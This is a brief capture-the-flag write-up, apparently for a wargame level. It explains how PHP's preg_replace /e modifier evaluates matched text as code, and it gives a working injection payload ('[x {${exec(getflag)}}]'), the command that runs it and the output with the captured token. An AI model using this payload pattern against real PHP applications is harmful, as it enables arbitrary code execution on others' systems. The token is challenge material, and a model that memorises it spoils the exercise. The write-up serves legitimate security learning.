# File level06.php, containt regex with modifier /e, with allow to use php code within regex, so what u parse will be evaluated as part of your prog

$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); # We can see the 2nd group (\\2) witch is (.*) will be evaluated as part of your prog

# So we need to exec getflag here by doing 
[x {${exec(getflag)}}]
(1 (       2        ))

# We call level06 with our regex in /tmp/file_name
./level06 /tmp/file_name
> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
